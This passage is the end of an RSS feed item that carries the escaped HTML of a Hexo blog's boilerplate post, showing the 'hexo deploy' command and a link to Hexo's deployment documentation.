&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
